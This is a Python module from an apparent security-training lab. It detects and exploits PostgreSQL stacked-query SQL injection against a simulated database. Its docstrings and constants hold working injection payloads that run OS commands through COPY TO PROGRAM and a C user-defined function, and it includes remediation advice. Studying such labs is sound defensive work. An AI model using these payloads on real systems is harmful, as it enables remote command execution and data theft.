r"""PostgreSQL RCE via stacked queries -> COPY TO PROGRAM / C UDF.

WHAT IT IS
----------
PostgreSQL is one of the few SQL backends whose wire protocol's *simple query*
path lets a single string carry **multiple statements separated by ``;``**
("stacked queries"). When an application concatenates untrusted input into a
query and runs it on that path, an attacker is no longer limited to subverting
the one SELECT -- they can *append entire new statements*, including DDL and
PostgreSQL's built-in command-execution primitives. Two of those primitives turn
a SQL-injection into full operating-system command execution as the database's
service account:

  (a) **COPY ... TO/FROM PROGRAM '<cmd>'** -- a superuser-only feature (since PG
      9.3) that pipes a table to/from an OS command. ``COPY (SELECT '') TO
      PROGRAM 'id'`` simply runs ``id`` on the server. It is the single cleanest
      SQLi -> RCE primitive in PostgreSQL.

  (b) **CREATE FUNCTION ... LANGUAGE C** -- define a SQL function backed by a
      native shared object and then call it. The classic weaponisation drops (or
      points at an already-present) ``.so`` exporting a ``sys(text)`` function
      that wraps ``system(3)``; ``SELECT sys('id')`` then executes commands. This
      is the historical "lateral/UDF" path that predates COPY TO PROGRAM and
      still works where COPY is restricted but ``CREATE FUNCTION`` is not.

The demo's sink is the textbook mistake -- user input spliced into a query that
the (PostgreSQL) backend runs on the stacked-query path::

    def _pg_search(h):                                      # GET /pg/search?q=<v>
        q = h._query().get("q", "")
        sql = f"SELECT name FROM products WHERE name ILIKE '%{q}%'"  # injectable
        result = h.state.pg.execute(sql)                   # PG: stacked ; allowed
        h._send_json(200, result)                          # {rows, outputs, notices}

Because ``q`` is concatenated raw, a value that closes the string literal with a
``'`` and adds ``; <statement> -- `` injects a second statement. A benign
``q=keyboard`` returns ``outputs: []`` (the lone SELECT produces no command
output); an injected ``COPY ... TO PROGRAM`` / UDF call makes ``outputs`` carry
the *stdout of an OS command* -- here the planted ``C.FLAGS["postgresql_rce"]``,
read with ``cat secret/pg_rce_flag.txt``.

NOTE: the lab uses a *simulated* PostgreSQL
(:class:`weblab.targetapp.pg_sim.PgSim`). It faithfully reproduces the
attacker-relevant surface -- stacked-query splitting that respects single-quoted
strings, ``COPY ... PROGRAM``, ``CREATE FUNCTION ... LANGUAGE C`` + call, large
objects, ``pg_read_file`` -- and routes "command execution" through the sandboxed
:func:`simulate_shell`. The injection mechanics (string break-out, statement
stacking, the two RCE primitives) are real and observable; no real ``psql`` /
``system()`` is ever invoked on the host. The lesson lands without spawning a
process from user input.

HOW WE DISCOVER IT
------------------
Layered, differential signals, each keyed on *command output* rather than a page
substring:

1.  **The benign baseline.** ``q=keyboard`` returns HTTP 200 with a parseable
    ``{rows, outputs, notices}`` JSON and an EMPTY ``outputs`` -- the lone SELECT
    runs no OS command. This anchors what "no injection" looks like and proves
    the JSON contract the detector parses.
2.  **Stacked-query break-out with a random sentinel.** We inject a second
    statement that runs ``echo <random-canary>`` via COPY TO PROGRAM:
    ``x' ; COPY (SELECT '') TO PROGRAM 'echo <canary>' -- ``. A backend that does
    NOT honour stacked queries (e.g. MySQL/SQLite via most drivers) would error
    or ignore the tail; PostgreSQL on the simple-query path executes it, and the
    canary appears in ``outputs`` on its own. The token is random per run, so a
    page that merely contains a common word cannot masquerade as a vulnerable
    sink -- this is the core "stacked queries are allowed" proof.

HOW WE EXPLOIT IT
-----------------
We demonstrate BOTH PostgreSQL RCE primitives, each recovering the planted flag
from ``result["outputs"]``:

  (a) COPY TO PROGRAM::

        q = "x' ; COPY (SELECT '') TO PROGRAM 'cat secret/pg_rce_flag.txt' -- "

  (b) C UDF (define then call)::

        q = "x' ; CREATE FUNCTION sys(text) RETURNS text AS '/lib/x.so','sys' "
            "LANGUAGE 'c' ; SELECT sys('cat secret/pg_rce_flag.txt') -- "

Both make the simulated PG run ``cat secret/pg_rce_flag.txt`` and place its
stdout -- ``C.FLAGS["postgresql_rce"]`` -- in ``outputs`` (the UDF path also
returns it as a row). In the real world this same primitive reads
``/etc/passwd`` and the DB's own ``.pgpass``/config, exfiltrates every secret the
postgres user can reach, drops a reverse shell, and pivots into the internal
network as the database service account.

THE FIX
-------
See :data:`REMEDIATION`. In one line: use **parameterised queries / prepared
statements** so input can never become SQL, disable multi-statement execution,
and run PostgreSQL as a **least-privilege, non-superuser** role with COPY ...
PROGRAM and untrusted ``CREATE FUNCTION ... LANGUAGE C`` denied.
"""
from __future__ import annotations

import uuid
from typing import Any, Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Fix the root cause -- untrusted input concatenated into SQL -- with "
    "PARAMETERISED QUERIES / prepared statements (e.g. psycopg "
    "cur.execute('SELECT name FROM products WHERE name ILIKE %s', (pattern,)) "
    "with the '%'..'%' wrapping done in Python, or PDO/parameterised commands in "
    "PHP/.NET). Parameter binding makes the input a VALUE that can never close "
    "the string literal or add a statement, which kills both the SELECT subversion "
    "AND the stacked-query escalation. Defence in depth that specifically blunts "
    "the PostgreSQL RCE primitives: (1) Do NOT run the application as a PostgreSQL "
    "SUPERUSER -- COPY ... TO/FROM PROGRAM and CREATE FUNCTION ... LANGUAGE C "
    "require superuser (or the pg_execute_server_program / pg_read_server_files "
    "roles); a least-privilege role with only SELECT/INSERT/UPDATE on its own "
    "tables cannot reach them. (2) Disable multi-statement execution: avoid the "
    "simple-query path / drivers that allow stacked queries, send exactly one "
    "statement per execute, and reject input containing statement terminators at "
    "the app layer as a backstop (never as the primary control). (3) Restrict "
    "dangerous features at the server: do not grant pg_execute_server_program, "
    "pg_read_server_files, pg_write_server_files; remove/avoid untrusted C "
    "extensions and lock down the extension allow-list (shared_preload_libraries, "
    "no world-writable lib dirs). (4) Apply least privilege to the OS account "
    "running postgres (sandbox/seccomp/AppArmor), network-segment the DB, and "
    "monitor for COPY ... PROGRAM and CREATE FUNCTION ... LANGUAGE 'c'. (5) Use an "
    "ORM/query builder consistently and add a WAF/allow-list as additional layers. "
    "Parameterise everything, drop superuser, and forbid COPY-PROGRAM / C UDFs."
)

#: The injectable sink, used as the Finding endpoint.
ENDPOINT: str = "/pg/search?q="

#: A benign search term: the lone SELECT runs, ``outputs`` stays empty (no OS
#: command executed). The control that anchors what "no injection" looks like.
BENIGN_QUERY: str = "keyboard"

#: (a) COPY ... TO PROGRAM -- the cleanest PostgreSQL SQLi -> RCE primitive. Closes
#: the ILIKE string, stacks a COPY that pipes an empty table to ``cat <flag>``.
COPY_PAYLOAD: str = (
    "x' ; COPY (SELECT '') TO PROGRAM 'cat secret/pg_rce_flag.txt' -- "
)

#: (b) C UDF -- define ``sys(text)`` backed by a native ``.so`` then call it, the
#: historical UDF -> RCE path. Stacks a CREATE FUNCTION + a SELECT that calls it.
UDF_PAYLOAD: str = (
    "x' ; CREATE FUNCTION sys(text) RETURNS text AS '/lib/x.so','sys' "
    "LANGUAGE 'c' ; SELECT sys('cat secret/pg_rce_flag.txt') -- "
)

#: The OS command both primitives run to read the planted RCE-proof file.
EXPLOIT_CMD: str = "cat secret/pg_rce_flag.txt"

#: Every payload the engine submits (public so the CLI / report can show exactly
#: what was attempted): both RCE primitives.
PAYLOADS: List[str] = [COPY_PAYLOAD, UDF_PAYLOAD]


# --- low-level probe ---------------------------------------------------------
def _search(client: WebClient, q: str) -> Response:
    """Request ``/pg/search?q=<q>`` (the client URL-encodes the value)."""
    return client.get("/pg/search", params={"q": q})


def _result(resp: Response) -> Optional[Dict[str, Any]]:
    """Parse the ``{rows, outputs, notices}`` JSON, or ``None`` if not parseable.

    The simulated PG always answers HTTP 200 with this shape; a malformed body or
    an ``{"error": ...}`` payload (a query the backend rejected) yields ``None``
    for the detectors/exploit, which key on the ``outputs`` channel.
    """
    if resp.status != 200:
        return None
    try:
        body = resp.json()
    except ValueError:
        return None
    if not isinstance(body, dict):
        return None
    if "outputs" not in body or "rows" not in body:
        return None
    return body


def _outputs_text(result: Optional[Dict[str, Any]]) -> str:
    """Flatten ``outputs`` (the command-output channel) to a single string."""
    if not result:
        return ""
    return "\n".join(str(o) for o in result.get("outputs", []))


# --- detection ---------------------------------------------------------------
def detect_baseline(client: WebClient) -> Tuple[bool, str]:
    """True if a benign search returns the JSON contract with EMPTY ``outputs``.

    The control: ``q=keyboard`` runs only the intended SELECT, so no OS command
    runs and ``outputs`` is empty. Confirms the ``{rows, outputs, notices}``
    contract the detector/exploit parse and anchors the "no injection" baseline.
    """
    resp = _search(client, BENIGN_QUERY)
    result = _result(resp)
    if result is not None and not result.get("outputs"):
        return True, (
            f"GET {ENDPOINT}{BENIGN_QUERY} returned a parseable "
            "{rows, outputs, notices} result with an EMPTY outputs channel "
            "(HTTP 200) -- the lone SELECT ran no OS command (baseline)"
        )
    return False, ""


def detect_stacked_queries(client: WebClient) -> Tuple[bool, str]:
    """True if a stacked ``; COPY ... TO PROGRAM 'echo <canary>'`` runs.

    Injects a second statement that runs ``echo <random-token>`` via COPY TO
    PROGRAM. A backend that does not honour stacked queries would error or ignore
    the tail; PostgreSQL on the simple-query path executes it and the canary lands
    in ``outputs`` on its own. The token is random per call, so a static page word
    cannot masquerade as a vulnerable sink -- this is the "stacked queries allowed"
    proof that distinguishes PG SQLi from a single-statement backend.
    """
    canary = "weblab-pgrce-" + uuid.uuid4().hex[:12]
    payload = f"x' ; COPY (SELECT '') TO PROGRAM 'echo {canary}' -- "
    result = _result(_search(client, payload))
    outputs = result.get("outputs", []) if result else []
    token_isolated = any(str(o).strip() == canary for o in outputs)
    if token_isolated:
        return True, (
            f"GET {ENDPOINT}{payload} stacked a second statement that ran "
            f"`echo` via COPY TO PROGRAM and returned the random token {canary!r} "
            "in outputs -- PostgreSQL honoured the `;` and executed our statement"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def _exploit_via(
    client: WebClient, payload: str
) -> Tuple[bool, Optional[str], Optional[Dict[str, Any]]]:
    """Run one RCE payload; recover the flag from ``result["outputs"]``.

    Returns ``(ok, flag, result)`` where ``result`` is the parsed
    ``{rows, outputs, notices}`` and ``flag`` is the planted secret if it appears
    in the ``outputs`` channel (proof an OS command's stdout was captured).
    """
    result = _result(_search(client, payload))
    if result is None:
        return False, None, None
    if C.FLAGS["postgresql_rce"] in _outputs_text(result):
        return True, C.FLAGS["postgresql_rce"], result
    return False, None, result


def exploit_copy_to_program(
    client: WebClient,
) -> Tuple[bool, Optional[str], Optional[Dict[str, Any]]]:
    """Path (a): ``COPY (SELECT '') TO PROGRAM 'cat secret/pg_rce_flag.txt'``.

    Returns ``(ok, flag, result)``; on success ``result["outputs"]`` carries the
    planted ``C.FLAGS["postgresql_rce"]`` -- the stdout of the OS command we ran.
    """
    return _exploit_via(client, COPY_PAYLOAD)


def exploit_c_udf(
    client: WebClient,
) -> Tuple[bool, Optional[str], Optional[Dict[str, Any]]]:
    """Path (b): ``CREATE FUNCTION sys(text) ... LANGUAGE 'c'`` then ``SELECT sys(...)``.

    Returns ``(ok, flag, result)``; on success the flag appears in
    ``result["outputs"]`` (and, for this path, also as a row).
    """
    return _exploit_via(client, UDF_PAYLOAD)


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect PostgreSQL stacked-query RCE, then exploit it via BOTH primitives.

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["postgresql_rce"]`` (from ``result["outputs"]``) and records both the
    COPY TO PROGRAM and C-UDF paths, with ``extra`` carrying the machine-readable
    detail (baseline ok, stacked-queries confirmed, which paths leaked the flag).
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    baseline_ok, baseline_ev = detect_baseline(client)
    if baseline_ok:
        techniques.append("benign-baseline")
    stacked_ok, stacked_ev = detect_stacked_queries(client)
    if stacked_ok:
        techniques.append("stacked-query-sentinel")

    # 2) Exploitation (both PostgreSQL RCE primitives) ----------------------
    copy_ok, copy_flag, copy_result = exploit_copy_to_program(client)
    if copy_ok:
        techniques.append("copy-to-program")
    udf_ok, udf_flag, udf_result = exploit_c_udf(client)
    if udf_ok:
        techniques.append("c-udf")

    flag = copy_flag or udf_flag
    # Discovery requires a confirmed stacked-query break-out AND at least one RCE
    # primitive to have placed the flag in the outputs channel.
    discovered = bool(stacked_ok and (copy_ok or udf_ok))

    working_paths = [
        name for name, ok in (("copy_to_program", copy_ok), ("c_udf", udf_ok)) if ok
    ]

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if stacked_ok:
        evidence_parts.append(f"stacked-queries: {stacked_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result: Dict[str, Any] = {
        "flag": flag,
        "payload": COPY_PAYLOAD if copy_ok else (UDF_PAYLOAD if udf_ok else ""),
        "exploit_cmd": EXPLOIT_CMD,
        "working_paths": working_paths,
        "copy_to_program": {
            "payload": COPY_PAYLOAD,
            "ok": copy_ok,
            "outputs": (copy_result or {}).get("outputs", []),
            "notices": (copy_result or {}).get("notices", []),
        },
        "c_udf": {
            "payload": UDF_PAYLOAD,
            "ok": udf_ok,
            "outputs": (udf_result or {}).get("outputs", []),
            "rows": (udf_result or {}).get("rows", []),
            "notices": (udf_result or {}).get("notices", []),
        },
        "techniques": techniques,
        "summary": (
            f"GET {ENDPOINT} on a PostgreSQL backend allowed STACKED queries; "
            f"both COPY TO PROGRAM and a C UDF ran {EXPLOIT_CMD!r} and returned "
            f"flag {flag!r} in result['outputs'] -- a SQLi -> OS command execution "
            "as the database service account"
        ),
    }

    return Finding(
        vuln="PostgreSQL RCE (stacked queries -> COPY TO PROGRAM / C UDF)",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=COPY_PAYLOAD if copy_ok else (UDF_PAYLOAD if udf_ok else ""),
        extra={
            "techniques": techniques,
            "benign_baseline_ok": baseline_ok,
            "stacked_queries_confirmed": stacked_ok,
            "copy_to_program_ok": copy_ok,
            "c_udf_ok": udf_ok,
            "flag_recovered": bool(copy_ok or udf_ok),
            "working_paths": working_paths,
            "copy_payload": COPY_PAYLOAD,
            "udf_payload": UDF_PAYLOAD,
            "exploit_cmd": EXPLOIT_CMD,
            "breakout": "' ; <statement> -- ",
        },
    )
